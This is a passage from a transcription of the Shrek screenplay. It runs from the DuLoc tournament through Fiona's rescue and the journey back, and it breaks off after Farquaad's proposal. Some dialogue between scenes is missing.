a table where there are mugs of                           beer)                                        CROWD                          Go ahead! Get him!                                       SHREK                          (holds up a mug of beer) Can\'t we just                           settle this over a pint?                                        CROWD                          Kill the beast!                                       SHREK                          No? All right then. (drinks the beer)                           Come on!                  He takes the mug and smashes the spigot off the large barrel                 of beer behind him. The beer comes rushing out drenching the                 other men and wetting the ground. It\'s like mud now. Shrek slides                 past the men and picks up a spear that one of the men dropped.                 As Shrek begins to fight Donkey hops up onto one of the larger                 beer barrels. It breaks free of it\'s ropes and begins to roll.                 Donkey manages to squish two men into the mud. There is so much                 fighting going on here I\'m not going to go into detail. Suffice                 to say that Shrek kicks butt.                                        DONKEY                          Hey, Shrek, tag me! Tag me!                 Shrek comes over and bangs a man\'s head up against Donkeys. Shrek                 gets up on the ropes and interacts with the crowd.                                        SHREK                          Yeah!                 A man tries to sneak up behind Shrek, but Shrek turns in time                 and sees him.                                        WOMAN                          The chair! Give him the chair!                 Shrek smashes a chair over the guys back. Finally all the men                 are down. Donkey kicks one of them in the helmet, and the ding                 sounds the end of the match. The audience goes wild.                                        SHREK                          Oh, yeah! Ah! Ah! Thank you! Thank you                           very much! I\'m here till Thursday. Try                           the veal! Ha, ha! (laughs)                  The laughter stops as all of the guards turn their weapons on                 Shrek.                                        HEAD GUARD                          Shall I give the order, sir?                                       FARQUAAD                          No, I have a better idea. People of                           DuLoc, I give you our champion!                                        SHREK                          What?                                       FARQUAAD                          Congratulations, ogre. You\'re won the                           honor of embarking on a great and noble                           quest.                                        SHREK                          Quest? I\'m already in a quest, a quest                           to get my swamp back.                                        FARQUAAD                          Your swamp?                                       SHREK                          Yeah, my swamp! Where you dumped those                           fairy tale creatures!                                        FARQUAAD                          Indeed. All right, ogre. I\'ll make you                           a deal. Go on this quest for me, and                           I\'ll give you your swamp back.                                        SHREK                          Exactly the way it was?                                       FARQUAAD                          Down to the last slime-covered toadstool.                                                                  SHREK                          And the squatters?                                       FARQUAAD                          As good as gone.                                       SHREK                          What kind of quest?                 Time Lapse - Donkey and Shrek are now walking through the field                 heading away from DuLoc. Shrek is munching on an onion.                                        DONKEY                          Let me get this straight. You\'re gonna                           go fight a dragon and rescue a princess                           just so Farquaad will give you back                           a swamp which you only don\'t have because                           he filled it full of freaks in the first                           place. Is that about right?                                        SHREK                          You know, maybe there\'s a good reason                           donkeys shouldn\'t talk.                                        DONKEY                          I don\'t get it. Why don\'t you just pull                           some of that ogre stuff on him? Throttle                           him, lay siege to his fortress, grinds                           his bones to make your bread, the whole                           ogre trip.                                        SHREK                          Oh, I know what. Maybe I could have                           decapitated an entire village and put                           their heads on a pike, gotten a knife,                           cut open their spleen and drink their                           fluids. Does that sound good to you?                                                                  DONKEY                          Uh, no, not really, no.                                       SHREK                          For your information, there\'s a lot                           more to ogres than people think.

SHREK                          You know, I think I preferred your humming.

Just the word parfait                           make me start slobbering.                  They head off. There is a montage of their journey. Walking through                 a field at sunset. Sleeping beneath a bright moon. Shrek trying                 to put the campfire out the next day and having a bit of a problem,                 so Donkey pees on the fire to put it out.                  DRAGON\'S KEEP                 Shrek and Donkey are walking up to the keep that\'s supposed to                 house Princess Fiona. It appears to look like a giant volcano.                                                        DONKEY                          (sniffs) Ohh! Shrek! Did you do that?                           You gotta warn somebody before you just                           crack one off. My mouth was open and                           everything.                                        SHREK                          Believe me, Donkey, if it was me, you\'d                           be dead. (sniffs) It\'s brimstone. We                           must be getting close.                                        DONKEY                          Yeah, right, brimstone. Don\'t be talking                           about it\'s the brimstone. I know what                           I smell. It wasn\'t no brimstone. It                           didn\'t come off no stone neither.                                            They climb up the side of the volcano/keep and look down. There                 is a small piece of rock right in the center and that is where                 the castle is. It is surrounded by boiling lava. It looks very                 foreboding.                                        SHREK                          Sure, it\'s big enough, but look at the                           location. (laughs...then the laugh turns                           into a groan)                                        DONKEY                          Uh, Shrek?

DONKEY                          (os) Dragon!                 Donkey gasps and takes off running as the dragon roars again.                 Shrek manages to grab Donkey out of the way just as the dragon                 breathes fire.                                        SHREK                          Donkey, look out! (he manages to get                           a hold of the dragons tail and holds                           on) Got ya!                  The dragon gets irritated at this and flicks it\'s tail and Shrek                 goes flying through the air and crashes through the roof of the                 tallest tower. Fiona wakes up with a jerk and looks at him lying                 on the floor.                                        DONKEY                          Oh! Aah! Aah!                 Donkey get cornered as the Dragon knocks away all but a small                 part of the bridge he\'s on.                                        DONKEY                          No. Oh, no, No! (the dragon roars) Oh,                           what large teeth you have. (the dragon                           growls) I mean white, sparkling teeth.                           I know you probably hear this all time                           from your food, but you must bleach,                           \'cause that is one dazzling smile you                           got there. Do I detect a hint of minty                           freshness? And you know what else? You\'re                           - - You\'re a girl dragon! Oh, sure!                           I mean, of course you\'re a girl dragon.                           You\'re just reeking of feminine beauty.                           (the dragon begins fluttering her eyes                           at him) What\'s the matter with you?                           You got something in your eye? Ohh.                           Oh. Oh. Man, I\'d really love to stay,                           but you know, I\'m, uh...(the dragon                           blows a smoke ring in the shape of a                           heart right at him, and he coughs) I\'m                           an asthmatic, and I don\'t know if it\'d                           work out if you\'re gonna blow smoke                           rings. Shrek! (the dragon picks him                           up with her teeth and carries him off)                           No! Shrek! Shrek! Shrek!                  FIONA\'S ROOM                 Shrek groans as he gets up off the floor. His back is to Fiona                 so she straightens her dress and lays back down on the bed. She                 then quickly reaches over and gets the bouquet of flowers off                 the side table. She then lays back down and appears to be asleep.                 Shrek turns and goes over to her. He looks down at Fiona for                 a moment and she puckers her lips. Shrek takes her by the shoulders                 and shakes her away.                                        FIONA                          Oh! Oh!                                       SHREK                          Wake up!                                       FIONA                          What?                                       SHREK                          Are you Princess Fiona?                                       FIONA                          I am, awaiting a knight so bold as to                           rescue me.                                        SHREK                          Oh, that\'s nice. Now let\'s go!                                       FIONA                          But wait, Sir Knight. This be-ith our                           first meeting. Should it not be a wonderful,                           romantic moment?                                        SHREK                          Yeah, sorry, lady. There\'s no time.                                                                  FIONA                          Hey, wait. What are you doing? You should                           sweep me off my feet out yonder window                           and down a rope onto your valiant steed.                                                                  SHREK                          You\'ve had a lot of time to plan this,                           haven\'t you?                                        FIONA                          (smiles) Mm-hmm.                 Shrek breaks the lock on her door and pulls her out and down                 the hallway.                                        FIONA                          But we have to savor this moment! You                           could recite an epic poem for me. A                           ballad? A sonnet! A limerick? Or something!                                                                  SHREK                          I don\'t think so.                                       FIONA                          Can I at least know the name of my champion?                                                                  SHREK                          Uh, Shrek.                                       FIONA                          Sir Shrek. (clears throat and holds                           out a handkerchief) I pray that you                           take this favor as a token of my gratitude.                                                                  SHREK                          Thanks!                 Suddenly they hear the dragon roar.                                       FIONA                          (surprised)You didn\'t slay the dragon?                                                                  SHREK                          It\'s on my to-do list. Now come on!                           (takes off running and drags Fiona behind                           him.)                                        FIONA                          But this isn\'t right! You were meant                           to charge in, sword drawn, banner flying.                           That\'s what all the other knights did.                                                                  SHREK                          Yeah, right before they burst into flame.                                                                  FIONA                          That\'s not the point. (Shrek suddenly                           stops and she runs into him.) Oh! (Shrek                           ignores her and heads for a wooden door                           off to the side.) Wait. Where are you                           going? The exit\'s over there.                                        SHREK                          Well, I have to save my ass.                                       FIONA                          What kind of knight are you?                                       SHREK                          One of a kind. (opens the door into                           the throne room)                                        DONKEY                          (os) Slow down. Slow down, baby, please.                           I believe it\'s healthy to get to know                           someone over a long period of time.                           Just call me old-fashioned. (laughs                           worriedly) (we see him up close and                           from a distance as Shrek sneaks into                           the room) I don\'t want to rush into                           a physical relationship. I\'m not emotionally                           ready for a commitment of, uh, this                           - - Magnitude really is the word I\'m                           looking for. Magnitude- - Hey, that                           is unwanted physical contact. Hey, what                           are you doing? Okay, okay. Let\'s just                           back up a little and take this one step                           at a time. We really should get to know                           each other first as friends or pen pals.                           I\'m on the road a lot, but I just love                           receiving cards - - I\'d really love                           to stay, but - - Don\'t do that! That\'s                           my tail! That\'s my personal tail. You\'re                           gonna tear it off. I don\'t give permission                           - - What are you gonna do with that?                           Hey, now. No way. No! No! No, no! No.                           No, no, no. No! Oh!                  Shrek grabs a chain that\'s connected to the chandelier and swings                 toward the dragon. He misses and he swings back again. He looks                 up and spots that the chandelier is right above the dragons head.                 He pulls on the chain and it releases and he falls down and bumps                 Donkey out of the way right as the dragon is about to kiss him.                 Instead the dragon kisses Shreks\' butt. She opens her eyes and                 roars. Shrek lets go of the chain and the chandelier falls onto                 her head, but it\'s too big and it goes over her head and forms                 a sort of collar for her. She roars again and Shrek and Donkey                 take off running. Very \'Matrix\' style. Shrek grabs Donkey and                 then grabs Princess Fiona as he runs past her.                                        DONKEY                          Hi, Princess!                                       FIONA                          It talks!                                       SHREK                          Yeah, it\'s getting him to shut up that\'s                           the trick.                  They all start screaming as the dragon gains on them. Shrek spots                 a descending slide and jumps on. But unfortunately there is a                 crack in the stone and it hits Shrek right in the groin. His                 eyes cross and as he reaches the bottom of the slide he stumbles                 off and walks lightly.                                        SHREK                          Oh!                 Shrek gets them close to the exit and sets down Donkey and Fiona.                                                        SHREK                          Okay, you two, heard for the exit! I\'ll                           take care of the dragon.                  Shrek grabs a sword and heads back toward the interior of the                 castle. He throws the sword down in between several overlapping                 chain links. The chain links are attached to the chandelier that                 is still around the dragons neck.                                        SHREK                          (echoing) Run!                 They all take off running for the exit with the dragon in hot                 pursuit. They make it to the bridge and head across. The dragons                 breathes fire and the bridge begins to burn. They all hang on                 for dear life as the ropes holding the bridge up collapse. They                 are swung to the other side. As they hang upside down they look                 in horror as the dragon makes to fly over the boiling lava to                 get them. But suddenly the chandelier with the chain jerk the                 dragon back and she\'s unable to get to them. Our gang climbs                 quickly to safety as the dragon looks angry and then gives a                 sad whimper as she watches Donkey walk away.                                        FIONA                          (sliding down the \'volcano\' hill) You                           did it! You rescued me! You\'re amazing.                           (behind her Donkey falls down the hill)                           You\'re - - You\'re wonderful. You\'re...                           (turns and sees Shrek fall down the                           hill and bump into Donkey) a little                           unorthodox I\'ll admit. But thy deed                           is great, and thy heart is pure. I am                           eternally in your debt. (Donkey clears                           his throat.) And where would a brave                           knight be without his noble steed?                                                                  DONKEY                          I hope you heard that. She called me                           a noble steed. She think I\'m a steed.                                                                  FIONA                          The battle is won. You may remove your                           helmet, good Sir Knight.                                        SHREK                          Uh, no.                                       FIONA                          Why not?

I would\'st look upon the face                           of my rescuer.                                        SHREK                          No, no, you wouldn\'t - - \'st.                                       FIONA                          But how will you kiss me?                                       SHREK                          What? (to Donkey) That wasn\'t in the                           job description.                                        DONKEY                          Maybe it\'s a perk.                                       FIONA                          No, it\'s destiny. Oh, you must know                           how it goes. A princess locked in a                           tower and beset by a dragon is rescued                           by a brave knight, and then they share                           true love\'s first kiss.                                        DONKEY                          Hmm? With Shrek? You think- - Wait.                           Wait. You think that Shrek is you true                           love?                                        FIONA                          Well, yes.                 Both Donkey and Shrek burst out laughing.                                       DONKEY                          You think Shrek is your true love!                                                                  FIONA                          What is so funny?                                       SHREK                          Let\'s just say I\'m not your type, okay?Fiona:                           Of course, you are. You\'re my rescuer.                           Now - - Now remove your helmet.                                        SHREK                          Look. I really don\'t think this is a                           good idea.                                        FIONA                          Just take off the helmet.                                       SHREK                          I\'m not going to.                                       FIONA                          Take it off.                                       SHREK                          No!                                       FIONA                          Now!                                       SHREK                          Okay! Easy. As you command. Your Highness.                           (takes off his helmet)                                        FIONA                          You- - You\'re a- - an ogre.                                       SHREK                          Oh, you were expecting Prince Charming.                                                                  FIONA                          Well, yes, actually. Oh, no. This is                           all wrong. You\'re not supposed to be                           an ogre.                                        SHREK                          Princess, I was sent to rescue you by                           Lord Farquaad, okay? He is the one who                           wants to marry you.                                        FIONA                          Then why didn\'t he come rescue me?                                                                  SHREK                          Good question. You should ask him that                           when we get there.                                        FIONA                          But I have to be rescued by my true                           love, not by some ogre and his- - his                           pet.                                        DONKEY                          Well, so much for noble steed.                                       SHREK                          You\'re not making my job any easier.                                                                  FIONA                          I\'m sorry, but your job is not my problem.                           You can tell Lord Farquaad that if he                           wants to rescue me properly, I\'ll be                           waiting for him right here.                                        SHREK                          Hey! I\'m no one\'s messenger boy, all                           right? (ominous) I\'m a delivery boy.                           (he swiftly picks her up and swings                           her over his shoulder like she was a                           sack of potatoes)                                        FIONA                          You wouldn\'t dare. Put me down!                                       SHREK                          Ya comin\', Donkey?                                       DONKEY                          I\'m right behind ya.                                       FIONA                          Put me down, or you will suffer the                           consequences! This is not dignified!                           Put me down!                  WOODS                 A little time has passed and Fiona has calmed down. She just                 hangs there limply while Shrek carries her.                                        DONKEY                          Okay, so here\'s another question. Say                           there\'s a woman that digs you, right,                           but you don\'t really like her that way.                           How do you let her down real easy so                           her feelings aren\'t hurt, but you don\'t                           get burned to a crisp and eaten?                                        FIONA                          You just tell her she\'s not your true                           love. Everyone knows what happens when                           you find your...(Shrek drops her on                           the ground) Hey! The sooner we get to                           DuLoc the better.                                        DONKEY                          You\'re gonna love it there, Princess.                           It\'s beautiful!                                        FIONA                          And what of my groom-to-be? Lord Farquaad?                           What\'s he like?                                        SHREK                          Let me put it this way, Princess. Men                           of Farquaad\'s stature are in short supply.                           (he and Donkey laugh)                  Shrek then proceeds to splash water onto his face to wash off                 the dust and grime.                                        DONKEY                          I don\'t know. There are those who think                           little of him. (they laugh again) Fiona:                           Stop it. Stop it, both of you. You\'re                           just jealous you can never measure up                           to a great ruler like Lord Farquaad.                                                                  SHREK                          Yeah, well, maybe you\'re right, Princess.                           But I\'ll let you do the ""measuring""                           when you see him tomorrow.                                        FIONA                          (looks at the setting sun) Tomorrow?                           It\'ll take that long? Shouldn\'t we stop                           to make camp?                                        SHREK                          No, that\'ll take longer. We can keep                           going.                                        FIONA                          But there\'s robbers in the woods.                                       DONKEY                          Whoa! Time out, Shrek! Camp is starting                           to sound good.                                        SHREK                          Hey, come on. I\'m scarier than anything                           we\'re going to see in this forest.                                                                  FIONA                          I need to find somewhere to camp now!                                            Both Donkey and Shrek\'s ears lower as they shrink away from her.                                  MOUNTAIN CLIFF                 Shrek has found a cave that appears to be in good order. He shoves                 a stone boulder out of the way to reveal the cave.                                        SHREK                          Hey! Over here.                                       DONKEY                          Shrek, we can do better than that. I                           don\'t think this is fit for a princess.                                                                  FIONA                          No, no, it\'s perfect. It just needs                           a few homey touches.                                        SHREK                          Homey touches? Like what? (he hears                           a tearing noise and looks over at Fiona                           who has torn the bark off of a tree.)                                                                  FIONA                          A door? Well, gentlemen, I bid thee                           good night. (goes into the cave and                           puts the bark door up behind her)                                                                  DONKEY                          You want me to read you a bedtime story?                           I will.                                        FIONA                          (os) I said good night!                 Shrek looks at Donkey for a second and then goes to move the                 boulder back in front of the entrance to the cave with Fiona                 still inside.                                        DONKEY                          Shrek, What are you doing?                                       SHREK                          (laughs) I just- - You know - - Oh,                           come on. I was just kidding.                  LATER THAT NIGHT                 Shrek and Donkey are sitting around a campfire. They are staring                 up into the sky as Shrek points out certain star constellations                 to Donkey.                                        SHREK                          And, uh, that one, that\'s Throwback,                           the only ogre to ever spit over three                           wheat fields.                                        DONKEY                          Right. Yeah. Hey, can you tell my future                           from these stars?                                        SHREK                          The stars don\'t tell the future, Donkey.                           They tell stories. Look, there\'s Bloodnut,                           the Flatulent. You can guess what he\'s                           famous for.                                        DONKEY                          I know you\'re making this up.                                       SHREK                          No, look. There he is, and there\'s the                           group of hunters running away from his                           stench.                                        DONKEY                          That ain\'t nothin\' but a bunch of little                           dots.                                        SHREK                          You know, Donkey, sometimes things are                           more than they appear. Hmm? Forget it.                                                                  DONKEY                          (heaves a big sigh) Hey, Shrek, what                           we gonna do when we get our swamp anyway?                                                                  SHREK                          Our swamp?                                       DONKEY                          You know, when we\'re through rescuing                           the princess.                                        SHREK                          We? Donkey, there\'s no ""we"". There\'s                           no ""our"". There\'s just me and my swamp.                           The first thing I\'m gonna do is build                           a ten-foot wall around my land.                                        DONKEY                          You cut me deep, Shrek. You cut me real                           deep just now. You know what I think?                           I think this whole wall thing is just                           a way to keep somebody out.                                        SHREK                          No, do ya think?                                       DONKEY                          Are you hidin\' something?                                       SHREK                          Never mind, Donkey.                                       DONKEY                          Oh, this is another one of those onion                           things, isn\'t it?                                        SHREK                          No, this is one of those drop-it and                           leave-it alone things.                                        DONKEY                          Why don\'t you want to talk about it?                                                                  SHREK                          Why do you want to talk about it?                                       DONKEY                          Why are you blocking?                                       SHREK                          I\'m not blocking.                                       DONKEY                          Oh, yes, you are.                                       SHREK                          Donkey, I\'m warning you.                                       DONKEY                          Who you trying to keep out?                                       SHREK                          Everyone! Okay?                                       DONKEY                          (pause) Oh, now we\'re gettin\' somewhere.                           (grins)                  At this point Fiona pulls the \'door\' away from the entrance to                 the cave and peaks out. Neither of the guys see her.                                        SHREK                          Oh! For the love of Pete! (gets up and                           walks over to the edge of the cliff                           and sits down)                                        DONKEY                          What\'s your problem? What you got against                           the whole world anyway?                                        SHREK                          Look, I\'m not the one with the problem,                           okay? It\'s the world that seems to have                           a problem with me. People take one look                           at me and go. ""Aah! Help! Run! A big,                           stupid, ugly ogre!"" They judge me before                           they even know me. That\'s why I\'m better                           off alone.                                        DONKEY                          You know what? When we met, I didn\'t                           think you was just a big, stupid, ugly                           ogre.                                        SHREK                          Yeah, I know.                                       DONKEY                          So, uh, are there any donkeys up there?                                                                  SHREK                          Well, there\'s, um, Gabby, the Small                           and Annoying.                                        DONKEY                          Okay, okay, I see it now. The big shiny                           one, right there. That one there?                                            Fiona puts the door back.                                       SHREK                          That\'s the moon.                                       DONKEY                          Oh, okay.                 DuLoc - Farquaad\'s Bedroom                 The camera pans over a lot of wedding stuff. Soft music plays                 in the background. Farquaad is in bed, watching as the Magic                 Mirror shows him Princess Fiona.                                        FARQUAAD                          Again, show me again. Mirror, mirror,                           show her to me. Show me the princess.                                                                  MIRROR                          Hmph.                 The Mirror rewinds and begins to play again from the beginning.                                                        FARQUAAD                          Ah. Perfect.                 Farquaad looks down at his bare chest and pulls the sheet up                 to cover himself as though Fiona could see him as he gazes sheepishly                 at her image in the mirror.                  MORNING                 Fiona walks out of the cave. She glances at Shrek and Donkey                 who are still sleeping. She wanders off into the woods and comes                 across a blue bird. She begins to sing. The bird sings along                 with her. She hits higher and higher notes and the bird struggles                 to keep up with her. Suddenly the pressure of the note is too                 big and the bird explodes. Fiona looks a little sheepish, but                 she eyes the eggs that the bird left behind. Time lapse, Fiona                 is now cooking the eggs for breakfast. Shrek and Donkey are still                 sleeping. Shrek wakes up and looks at Fiona. Donkey\'s talking                 in his sleep.                                        DONKEY                          (quietly) Mmm, yeah, you know I like                           it like that. Come on, baby. I said                           I like it.                                        SHREK                          Donkey, wake up. (shakes him)                                       DONKEY                          Huh? What?                                       SHREK                          Wake up.                                       DONKEY                          What? (stretches and yawns)                                       FIONA                          Good morning. Hm, how do you like your                           eggs?                                        DONKEY                          Oh, good morning, Princess!                 Fiona gets up and sets the eggs down in front of them.                                       SHREK                          What\'s all this about?                                       FIONA                          You know, we kind of got off to a bad                           start yesterday. I wanted to make it                           up to you. I mean, after all, you did                           rescue me.                                        SHREK                          Uh, thanks.                 Donkey sniffs the eggs and licks his lips.                                       FIONA                          Well, eat up. We\'ve got a big day ahead                           of us. (walks off)                  LATER                 They are once again on their way. They are walking through the                 forest. Shrek belches.                                        DONKEY                          Shrek!                                       SHREK                          What? It\'s a compliment. Better out                           than in, I always say. (laughs)                                        DONKEY                          Well, it\'s no way to behave in front                           of a princess.                  Fiona belches                                       FIONA                          Thanks.                                       DONKEY                          She\'s as nasty as you are.                                       SHREK                          (chuckles) You know, you\'re not exactly                           what I expected.                                        FIONA                          Well, maybe you shouldn\'t judge people                           before you get to know them.                  She smiles and then continues walking, singing softly. Suddenly                 from out of nowhere, a man swings down and swoops Fiona up into                 a tree.                                        ROBIN HOOD                          La liberte! Hey!                                       SHREK                          Princess!

And I am rescuing you from this green...(kisses                           up her arm while Fiona pulls back in                           disgust)...beast.                                        SHREK                          Hey! That\'s my princess! Go find you                           own!                                        ROBIN HOOD                          Please, monster! Can\'t you see I\'m a                           little busy here?                                        FIONA                          (getting fed up) Look, pal, I don\'t                           know who you think you are!                                        ROBIN HOOD                          Oh! Of course! Oh, how rude. Please                           let me introduce myself. Oh, Merry Men.                           (laughs)                  Suddenly an accordion begins to play and the Merry men pop out                 from the bushes. They begin to sing Robin\'s theme song.                                        MERRY MEN                          Ta, dah, dah, dah, whoo.

MERRY MEN                          He takes a wee percentage,                                       ROBIN HOOD                          But I\'m not greedy. I rescue pretty                           damsels, man, I\'m good.

I like an honest fight                           and a saucy little maid...                                        MERRY MEN                          What he\'s basically saying is he likes                           to get...                                        ROBIN HOOD                          Paid.

MERRY MEN                          That\'s bad.                                       ROBIN HOOD                          When a beauty\'s with a beast it makes                           me awfully mad.                                        MERRY MEN                          He\'s mad, he\'s really, really mad.                                                                  ROBIN HOOD                          I\'ll take my blade and ram it through                           your heart, keep your eyes on me, boys                           \'cause I\'m about to start...                  There is a grunt as Fiona swings down from the tree limb and                 knocks Robin Hood unconscious.                                        FIONA                          Man, that was annoying!                 Shrek looks at her in admiration.                                       MERRY MAN                          Oh, you little- - (shoots an arrow at                           Fiona but she ducks out of the way)                                            The arrow flies toward Donkey who jumps into Shrek\'s arms to                 get out of the way. The arrow proceeds to just bounce off a tree.                                  Another fight sequence begins and Fiona gives a karate yell and                 then proceeds to beat the crap out of the Merry Men. There is                 a very interesting \'Matrix\' moment here when Fiona pauses in                 mid-air to fix her hair. Finally all of the Merry Men are down,                 and Fiona begins walking away.                                        FIONA                          Uh, shall we?                                       SHREK                          Hold the phone. (drops Donkey and begins                           walking after Fiona) Oh! Whoa, whoa,                           whoa. Hold on now. Where did that come                           from?                                        FIONA                          What?                                       SHREK                          That! Back there. That was amazing!                           Where did you learn that?                                        FIONA                          Well...(laughs) when one lives alone,                           uh, one has to learn these things in                           case there\'s a...(gasps and points)                           there\'s an arrow in your butt!                                        SHREK                          What? (turns and looks) Oh, would you                           look at that? (he goes to pull it out                           but flinches because it\'s tender)                                                                  FIONA                          Oh, no. This is all my fault. I\'m so                           sorry.                                        DONKEY                          (walking up) Why?

DONKEY                          You can\'t do this to me, Shrek. I\'m                           too young for you to die. Keep you legs                           elevated. Turn your head and cough.                           Does anyone know the Heimlich?                                        FIONA                          Donkey! Calm down. If you want to help                           Shrek, run into the woods and find me                           a blue flower with red thorns.                                        DONKEY                          Blue flower, red thorns. Okay, I\'m on                           it. Blue flower, red thorns. Don\'t die                           Shrek. If you see a long tunnel, stay                           away from the light!

FIONA                          (like it\'s obvious) For getting rid                           of Donkey.                                        SHREK                          Ah.                                       FIONA                          Now you hold still, and I\'ll yank this                           thing out.

Easy with the                           yankin\'.                  As they continue to talk Fiona keeps going after the arrow and                 Shrek keeps dodging her hands.                                        FIONA                          I\'m sorry, but it has to come out.

Shrek walks over and picks him up as they continue                 on their way.                  There is a montage of scenes as the group heads back to DuLoc.                 Shrek crawling up to the top of a tree to make it fall over a                 small brook so that Fiona won\'t get wet. Shrek then gets up as                 Donkey is just about to cross the tree and the tree swings back                 into it\'s upright position and Donkey flies off. Shrek swatting                 and a bunch of flies and mosquitoes. Fiona grabs a nearby spiderweb                 that\'s on a tree branch and runs through the field swinging it                 around to catch the bugs. She then hands it to Shrek who begins                 eating like it\'s a treat. As he walks off she licks her fingers.                 Shrek catching a toad and blowing it up like a balloon and presenting                 it to Fiona. Fiona catching a snake, blowing it up, fashioning                 it into a balloon animal and presenting it to Shrek.

This is good. This is really good.                           What is this?                                        SHREK                          Uh, weed rat. Rotisserie style.                                       FIONA                          No kidding. Well, this is delicious.                                                                  SHREK                          Well, they\'re also great in stews. Now,                           I don\'t mean to brag, but I make a mean                           weed rat stew. (chuckles)                  Fiona looks at DuLoc and sighs.                                       FIONA                          I guess I\'ll be dining a little differently                           tomorrow night.

They smiles at each other.                                       SHREK                          Um, Princess?

FIONA                          (jumps up) Sunset? Oh, no! I mean, it\'s                           late. I-It\'s very late.                                        SHREK                          What?                                       DONKEY                          Wait a minute. I see what\'s goin\' on                           here.

I used to                           be afraid of the dark, too, until -                           - Hey, no, wait. I\'m still afraid of                           the dark.                  Shrek sighs                                       FIONA                          Good night.                                       SHREK                          Good night.                 Fiona goes inside the windmill and closes the door. Donkey looks                 at Shrek with a new eye.                                        DONKEY                          Ohh!

SHREK                          I- - There\'s nothing to tell. Besides,                           even if I did tell her that, well, you                           know - - and I\'m not sayin\' I do \'cause                           I don\'t - - she\'s a princess, and I\'m                           - -                                        DONKEY                          An ogre?                                       SHREK                          Yeah. An ogre.                                       DONKEY                          Hey, where you goin\'?                                       SHREK                          To get... move firewood. (sighs)                 Donkey looks over at the large pile of firewood there already                 is.                  TIME LAPSE                 Donkey opens the door to the Windmill and walks in. Fiona is                 nowhere to be seen.                                        DONKEY                          Princess? Princess Fiona? Princess,                           where are you? Princess?                  Fiona looks at Donkey from the shadows, but we can\'t see her.                                                        DONKEY                          It\'s very spooky in here. I ain\'t playing                           no games.                  Suddenly Fiona falls from the railing. She gets up only she doesn\'t                 look like herself. She looks like an ogre and Donkey starts freaking                 out.                                        DONKEY                          Aah!

DONKEY                          What did you do with the princess?

Donkey looks into her eyes as she pets his muzzle, and he quiets                 down.                                        DONKEY                          Princess? What happened to you?

OUTSIDE                 Shrek is walking towards the windmill with a sunflower in his                 hand.                                        SHREK                          (to himself) Princess, I - - Uh, how\'s                           it going, first of all? Good? Um, good                           for me too. I\'m okay.

But I like you anyway.                           I\'d - - uh, uh...(sighs) I\'m in trouble.                           Okay, here we go.                  He walks up to the door and pauses outside when he hears Donkey                 and Fiona talking.                                        FIONA                          (os) I can\'t just marry whoever I want.                           Take a good look at me, Donkey. I mean,                           really, who can ever love a beast so                           hideous and ugly? ""Princess"" and ""ugly""                           don\'t go together. That\'s why I can\'t                           stay here with Shrek.                  Shrek steps back in shock.                                       FIONA                          (os) My only chance to live happily                           ever after is to marry my true love.                                            Shrek heaves a deep sigh. He throws the flower down and walks                 away.                  INSIDE                                       FIONA                          Don\'t you see, Donkey? That\'s just how                           it has to be. It\'s the only way to break                           the spell.                                        DONKEY                          You at least gotta tell Shrek the truth.                                                                  FIONA                          No! You can\'t breathe a word. No one                           must ever know.                                        DONKEY                          What\'s the point of being able to talk                           if you gotta keep secrets?                                        FIONA                          Promise you won\'t tell. Promise!                                       DONKEY                          All right, all right. I won\'t tell him.                           But you should. (goes outside) I just                           know before this is over, I\'m gonna                           need a whole lot of serious therapy.                           Look at my eye twitchin\'.                  Fiona comes out the door and watches him walk away. She looks                 down and spots the sunflower. She picks it up before going back                 inside the windmill.                  MORNING                 Donkey is asleep. Shrek is nowhere to be seen. Fiona is still                 awake. She is plucking petals from the sunflower.                                        FIONA                          I tell him, I tell him not. I tell him,                           I tell him not. I tell him. (she quickly                           runs to the door and goes outside) Shrek!                           Shrek, there\'s something I want...(she                           looks and sees the rising sun, and as                           the sun crests the sky she turns back                           into a human.)                  Just as she looks back at the sun she sees Shrek stomping towards                 her.                                        FIONA                          Shrek. Are you all right?                                       SHREK                          Perfect! Never been better.                                       FIONA                          I - - I don\'t - - There\'s something                           I have to tell you.                                        SHREK                          You don\'t have to tell me anything,                           Princess. I heard enough last night.                                                                  FIONA                          You heard what I said?                                       SHREK                          Every word.                                       FIONA                          I thought you\'d understand.                                       SHREK                          Oh, I understand. Like you said, ""Who                           could love a hideous, ugly beast?""                                                                  FIONA                          But I thought that wouldn\'t matter to                           you.                                        SHREK                          Yeah? Well, it does. (Fiona looks at                           him in shock. He looks past her and                           spots a group approaching.) Ah, right                           on time. Princess, I\'ve brought you                           a little something.                  Farquaad has arrived with a group of his men. He looks very regal                 sitting up on his horse. You would never guess that he\'s only                 like 3 feet tall. Donkey wakes up with a yawn as the soldiers                 march by.                                        DONKEY                          What\'d I miss? What\'d I miss? (spots                           the soldiers) (muffled) Who said that?                           Couldn\'t have been the donkey.                                        FARQUAAD                          Princess Fiona.                                       SHREK                          As promised. Now hand it over.                                       FARQUAAD                          Very well, ogre. (holds out a piece                           of paper) The deed to your swamp, cleared                           out, as agreed. Take it and go before                           I change my mind. (Shrek takes the paper)                           Forgive me, Princess, for startling                           you, but you startled me, for I have                           never seen such a radiant beauty before.                           I\'m Lord Farquaad.                                        FIONA                          Lord Farquaad? Oh, no, no. (Farquaad                           snaps his fingers) Forgive me, my lord,                           for I was just saying a short... (Watches                           as Farquaad is lifted off his horse                           and set down in front of her. He comes                           to her waist.) farewell.                                        FARQUAAD                          Oh, that is so sweet. You don\'t have                           to waste good manners on the ogre. It\'s                           not like it has feelings.                                        FIONA                          No, you\'re right. It doesn\'t.                 Donkey watches this exchange with a curious look on his face.                                                        FARQUAAD                          Princess Fiona, beautiful, fair, flawless                           Fiona. I ask your hand in marriage.                           Will you be the perfect bride for the                           perfect groom?                                        FIONA                          Lord Farquaad, I accept. Nothing would                           make - -                                        FARQUAAD                          (interrupting) Excellent! I\'ll start                           the plans, for tomorrow we wed!                                        FIONA                          No! I mean, uh, why wait? Let\'s get                           married today before the sun sets.                                                                  FARQUAAD                          Oh, anxious, are you? You\'re right.                           The sooner, the better. There\'s so much                           to do! There\'s the caterer, the cake,                           the band, the guest list. Captain, round                           up some guests! (a guard puts Fiona                           on the back of his horse)                                        FIONA                          Fare-thee-well, ogre.                 Farquaad\'s whole party begins to head back to DuLoc. Donkey watches                 them go.                                        DONKEY                          Shrek, what are you doing? You\'re letting                           her get away.                                        SHREK                          Yeah? So what?                                       DONKEY                          Shrek, there\'s something about her you                           don\'t know. Look, I talked to her last                           night, She\'s - -                                        SHREK                          I know you talked to her last night.                           You\'re great pals, aren\'t ya? Now, if                           you two are such good friends, why don\'t                           you follow her home?                                        DONKEY                          Shrek, I - - I wanna go with you.                                       SHREK                          I told you, didn\'t I? You\'re not coming                           home with me. I live alone! My 